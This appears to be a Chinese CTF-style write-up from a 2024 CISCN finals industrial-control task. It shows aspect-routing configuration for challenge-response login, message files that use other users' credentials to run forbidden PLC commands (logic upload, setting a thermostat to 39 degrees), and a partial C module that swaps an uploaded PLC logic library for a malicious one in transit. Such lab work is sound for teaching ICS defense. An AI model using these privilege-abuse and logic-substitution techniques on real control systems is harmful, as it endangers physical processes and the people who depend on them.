        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
        <span class="token property">"init_para"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                <span class="token property">"mode"</span><span class="token operator">:</span><span class="token number">2</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span><span class="token punctuation">,</span>
        <span class="token property">"libname"</span><span class="token operator">:</span><span class="token string">"logic_upload"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<blockquote>
<p>挑战-应答机制中，用户和服务器之间会进行<strong>两次交互</strong>，而旧的消息路由只提供了一次交互流程，需要重新配置认证流程</p>
</blockquote>
<p>旧的身份认证流程是用login路由来认证的，它由engineer&#x2F;user，engineer&#x2F;station和monitor_center中定义的login路由相互连接而形成，类型为QUERY，表示该路由为登录后返回的过程。</p>
<p>而在支持挑战-应答机制时，<strong>login_user在收到返回消息后，会生成状态为CHALLENGE格式的登录消息，这个消息将再次发送到server端并完成登录行为</strong>。</p>
<p>我们把工程师站login_user收到用户登录消息后，发送消息给管理中心login_server，并获得挑战信息的过程看做是插入到原有登录过程中的新过程，就可以使用cube架构中的<strong>切面路由机制</strong>。</p>
<p>这个机制定义的路由一般放在aspect_policy.cfg中，选项可定为ASPECT，是指在原路由中插入了一段处理过程，处理过程完成后回到原本路由。 用路由图来描述则如下所示：</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
<p>切面路由将有自己的新名称，这里我们将新的切面路由命名为 challenge_login，在管理中心的路由配置文件中定义，可以把它当作是由切入点开始的QUERY格式路由（询问模式，发出消息抵达目标后原路返回)，最终回到切入点，再重新执行原流程。</p>
<p>instance&#x2F;engineer&#x2F;station&#x2F;aspect_policy.cfg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"policy_head"</span><span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
       		<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"ASPECT"</span><span class="token punctuation">,</span>
        	<span class="token property">"sender"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">,</span>
		<span class="token property">"ljump"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
		<span class="token property">"rjump"</span><span class="token operator">:</span><span class="token number">-2</span><span class="token punctuation">,</span>
		<span class="token property">"newname"</span><span class="token operator">:</span><span class="token string">"challenge_login"</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token property">"MATCH_RULES"</span><span class="token operator">:</span>
	<span class="token punctuation">[</span>
		<span class="token punctuation">&#123;</span>
			<span class="token property">"op"</span><span class="token operator">:</span><span class="token string">"AND"</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"USER_DEFINE"</span><span class="token punctuation">,</span><span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIN"</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">]</span><span class="token punctuation">,</span>
	<span class="token property">"ROUTE_RULES"</span><span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token property">"main_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
			<span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"CONN"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"center_client"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
		<span class="token punctuation">]</span>
        	<span class="token property">"response_policy"</span><span class="token operator">:</span><span class="token punctuation">[</span>
			<span class="token punctuation">&#123;</span><span class="token property">"target_type"</span><span class="token operator">:</span><span class="token string">"LOCAL"</span><span class="token punctuation">,</span><span class="token property">"target_name"</span><span class="token operator">:</span><span class="token string">"login_user"</span><span class="token punctuation">&#125;</span>
        	<span class="token punctuation">]</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><code>policy_head</code>：拦截位置</p>
</li>
<li><p><code>name</code>：被拦截路由</p>
</li>
<li><p><code>type</code>有两种取值：</p>
<p>复制（<code>DUP</code>）表示从原路由复制信息，不改变原路由传输方式</p>
<p>拦截（<code>ASPECT</code>）则是让原路由转去新路由进行处理，完成处理后无异常情况则返回原路由途径</p>
</li>
<li><p><code>ljump</code>表示是在本地路由的第几跳（生成&#x2F;收到消息为第1跳，经过一个模块增加1跳，<code>sender</code>表示路由的发送者，这两个共同定义了路由的起始位置。<code>rjump</code>是一个准备被废弃或替代的参数，在这里的唯一作用是用负值表示拦截的是返回信息。</p>
</li>
<li><p><code>newname</code>则表示复制或拦截路由所在的新路由名称，这里复制路由上的消息将沿着新路由传播，而拦截路由上的消息则在完成新路由并返回后，重新进入原路由，沿着拦截点继续传播。</p>
</li>
<li><p><code>MATCH_RULES</code>中的内容表示切面触发时消息要满足的条件，<code>ROUTE_RULES</code>则指消息在新路由中传播的路径。这里的路由可以指向其它实例，在其它实例中与其对接的路由应当是与新路由名称一致的DELIVER格式路由（与DUP格式切面路由对接）或QUERY格式路由（与ASPECT格式路由对接）。</p>
</li>
</ul>
<p>aspect_policy.cfg.task_1_3：直接复制<code>./instance/engineer/station/plugin_config.cfg</code>文件的内容就行，拦截-转发逻辑是预先写好的</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240712191107681.png" alt="image-20240712191107681"></p>
<hr>
<h2 id="攻击模拟任务"><a href="#攻击模拟任务" class="headerlink" title="攻击模拟任务"></a>攻击模拟任务</h2><h3 id="越权访问"><a href="#越权访问" class="headerlink" title="越权访问"></a>越权访问</h3><p>本过程由用户测试系统中可以进行越权访问的位置</p>
<p>本系统中，工程师、操作员和系统监视员除可执行规定允许的操作外，还有如下限制：</p>
<ol>
<li>工程师可以登录操作员站和管理终端，但只能观察数据，不能执行调节温度等控制行为。</li>
<li>操作员可以登录管理终端，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li>
<li>监视员可以登录操作员站，但只能观察数据，不能在监视终端执行调节温度等控制行为。</li>
<li>操作员和监视员均可登录工程师站，但不能执行代码上传和逻辑上传命令。</li>
</ol>
<blockquote>
<p>请在工程师站、操作员站和监视终端进行测试，找到可以违规操作的点</p>
</blockquote>
<p>控制行为用调节温度到39度代表，参考操作员用户目录下的plc_set_t.msg</p>
<p>上传命令则用代码上传代表，参考工程师用户目录下的code_upload.msg</p>
<p>在工程师站、操作员站和管理终端各找到两个可违规操作点，按照下表创建违规登录与操作的组合消息：</p>
<table>
<thead>
<tr>
<th>位置</th>
<th>编号</th>
<th>登录（使用非合规用户）</th>
<th>操作（非合规用户执行违规操作）</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>工程师用户</td>
<td>违规点1</td>
<td>attack_login1.msg</td>
<td>attack_cmd1.msg</td>
<td></td>
</tr>
<tr>
<td></td>
<td>违规点2</td>
<td>attack_login2.msg</td>
<td>attack_cmd2.msg</td>
<td></td>
</tr>
<tr>
<td>操作员用户</td>
<td>违规点3</td>
<td>attack_login3.msg</td>
<td>attack_cmd3.msg</td>
<td></td>
</tr>
<tr>
<td></td>
<td>违规点4</td>
<td>attack_login4.msg</td>
<td>attack_cmd4.msg</td>
<td></td>
</tr>
<tr>
<td>监视员用户</td>
<td>违规点5</td>
<td>attack_login5.msg</td>
<td>attack_cmd5.msg</td>
<td></td>
</tr>
<tr>
<td></td>
<td>违规点6</td>
<td>attack_login6.msg</td>
<td>attack_cmd6.msg</td>
<td></td>
</tr>
</tbody></table>
<p>对上面的描述进行阅读理解，形成一个表格（byd这几句话真给我cpu干烧了）</p>
<table>
<thead>
<tr>
<th></th>
<th>登录操作员站</th>
<th>登录监视终端</th>
<th>登录工程师站</th>
<th>操作员站调节温度</th>
<th>监视终端调节温度</th>
<th>代码上传和逻辑上传</th>
</tr>
</thead>
<tbody><tr>
<td>工程师</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
<td>√</td>
</tr>
<tr>
<td>操作员</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td></td>
</tr>
<tr>
<td>监视员</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td></td>
<td>√</td>
<td></td>
</tr>
</tbody></table>
<p>那么，违规的情况就是：</p>
<p>工程师站：</p>
<ul>
<li>操作员执行文件上传</li>
<li>监视员执行文件上传</li>
</ul>
<p>操作员站：</p>
<ul>
<li>工程师执行调节温度</li>
<li>监视员执行调节温度</li>
</ul>
<p>监视终端：</p>
<ul>
<li>操作员执行调节温度</li>
<li>工程师执行调节温度</li>
</ul>
<p>于是就能开始改文件了，用户名见<a href="#user.list">user.list</a></p>
<p>attack_login1.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd1.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"qian"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_login2.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd2.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_ENGINEER"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"LOGIC_UPLOAD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"logic_filename"</span><span class="token operator">:</span><span class="token string">"thermostat_logic.c"</span><span class="token punctuation">,</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"FILE_CODE"</span><span class="token punctuation">,</span>
	<span class="token property">"author"</span><span class="token operator">:</span><span class="token string">"sun"</span><span class="token punctuation">,</span>
	<span class="token property">"uploader"</span><span class="token operator">:</span><span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112158556.png" alt="image-20240713112158556"></p>
<p>attack_login3.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"sun:123"</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd3.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"sun"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_login4.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd4.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112608105.png" alt="image-20240713112608105"></p>
<p>attack_login5.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"zhao:123"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd5.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"zhao"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_login6.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"GENERAL_RETURN"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"STRING"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"login"</span><span class="token punctuation">,</span>
	<span class="token property">"return_value"</span><span class="token operator">:</span><span class="token string">"qian:456"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>attack_cmd6.msg</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
	<span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"PLC_OPERATOR"</span><span class="token punctuation">,</span>
	<span class="token property">"subtype"</span><span class="token operator">:</span><span class="token string">"PLC_CMD"</span><span class="token punctuation">,</span>
	<span class="token property">"mode"</span><span class="token operator">:</span><span class="token string">"INT"</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
	<span class="token property">"plc_devname"</span><span class="token operator">:</span><span class="token string">"thermostat"</span><span class="token punctuation">,</span>
	<span class="token property">"action"</span><span class="token operator">:</span><span class="token string">"ADJUST"</span><span class="token punctuation">,</span>
	<span class="token property">"action_desc"</span><span class="token operator">:</span><span class="token string">"set_T"</span><span class="token punctuation">,</span>
	<span class="token property">"value"</span><span class="token operator">:</span><span class="token number">3900</span><span class="token punctuation">,</span>
	<span class="token property">"plc_operator"</span><span class="token operator">:</span><span class="token string">"qian"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713112954670.png" alt="image-20240713112954670"></p>
<hr>
<h3 id="恶意逻辑"><a href="#恶意逻辑" class="headerlink" title="恶意逻辑"></a>恶意逻辑</h3><p>本任务显示攻击者通过用恶意逻辑替代正常逻辑对系统进行攻击的行为。</p>
<p>在<code>logic/hack_logic</code>中，设置了恶意的温度逻辑，在10秒后将始终保持设置温度档位为最高档。这里hack_logic没有列在security的makefile中，需要单独编译，编译后，我们可以看到目录下会出现一个 libthermostat_logic.so 文件，这个文件是用来冒充合法逻辑的恶意逻辑文件。</p>
<blockquote>
<p>请为<code>file_replace</code>模块<strong>填充文件替换代码</strong>，并通过修改模块配置文件和切面路由文件，拦截工程师站到plc的二进制逻辑文件传输过程(bin_upload路由），使得file_replace模块在合适位置发挥作用，将所传输的libthermostat_logic.so文件内容替换为hack_logic目录下的同名文件，从而导致系统运行一段时间后温度失控。</p>
</blockquote>
<p>可以用<code>task_2_2_1.sh</code>脚本测试二进制逻辑上传过程，用<code>task_2_2_2.sh</code>脚本测试逻辑运行情况，该脚本启动后会5秒读一次温度状况，重复四次。</p>
<br>

<p>本题需要修改三个文件：</p>
<ul>
<li><code>file_replace.c</code> ：在收到二进制逻辑传输命令后，将正常逻辑替换成hack_logic目录下的恶意逻辑</li>
<li><code>plugin_config.cfg.task_2_2</code> ：在配置文件中添加file_replace模块</li>
<li><code>aspect_policy.cfg.task_2_2</code> ：在<code>bin_upload</code>传输过程中插入<code>file_replace</code>模块，使其可以在上传代码时用hack_logic中恶意逻辑替换合法逻辑</li>
</ul>
<p>涉及到两个模块需要接触</p>
<ul>
<li><code>file_replace</code> ：<code>2024buildup/src/security/file_replace</code>，需要编写<code>file_replace.c</code> 做到自动替换恶意模块</li>
<li><code>hack_logic </code>：<code>2024buildup/src/logic/hack_logic</code></li>
</ul>
<p>手册的可读性太差，直接跑一个task_2_2_1.sh看看其日志文件再对着改</p>
<p>观察src&#x2F;system&#x2F;logic_upload&#x2F;logic_upload.c的行为，看看是否有攻击的切入点</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240713120324134.png" alt="image-20240713120324134"></p>
<p>在这个地方完成了文件的复制，然后再也没管过，也没有任何的校验措施。后续是连着文件名一起发了过去的，如果能对这个文件名指向的文件进行覆写应该就能成了</p>
<p>src&#x2F;security&#x2F;file_replace&#x2F;file_replace.c</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bin_file_replace</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> sub_proc<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span> recv_msg<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> type<span class="token punctuation">;</span>
        <span class="token keyword">int</span> subtype<span class="token punctuation">;</span>
        <span class="token keyword">int</span> i<span class="token punctuation">;</span>
        <span class="token keyword">int</span> ret<span class="token punctuation">;</span>

        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> bin_upload<span class="token punctuation">;</span>
        ret<span class="token operator">=</span><span class="token function">message_get_record</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">,</span><span class="token operator">&amp;</span>bin_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
        <span class="token comment">// 在这里添加文件替换代码</span>

        <span class="token keyword">void</span><span class="token operator">*</span> c<span class="token operator">=</span><span class="token function">message_clone</span><span class="token punctuation">(</span>recv_msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_UPLOAD<span class="token punctuation">)</span> <span class="token operator">*</span> logic_upload<span class="token punctuation">;</span>
        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_CODE<span class="token punctuation">)</span> <span class="token operator">*</span> logic_code<span class="token punctuation">;</span>
        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_bin<span class="token punctuation">;</span>
        <span class="token function">RECORD</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_RETURN<span class="token punctuation">)</span> <span class="token operator">*</span> logic_return<span class="token punctuation">;</span>
        MSG_EXPAND <span class="token operator">*</span> msg_expand<span class="token punctuation">;</span>

        <span class="token function">message_get_record</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token operator">&amp;</span>logic_upload<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">message_remove_expand</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token function">TYPE_PAIR</span><span class="token punctuation">(</span>PLC_ENGINEER<span class="token punctuation">,</span>LOGIC_BIN<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>msg_expand<span class="token punctuation">)</span><span class="token punctuation">;</span>

        logic_bin <span class="token operator">=</span> msg_expand<span class="token operator">-></span>expand<span class="token punctuation">;</span>

        <span class="token function">puts</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>plc_devname<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token operator">*</span> s<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span><span class="token operator">*</span> dic<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>DIGEST_SIZE<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                s<span class="token punctuation">[</span>i<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>dic<span class="token punctuation">[</span><span class="token punctuation">(</span>logic_upload<span class="token operator">-></span>uuid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
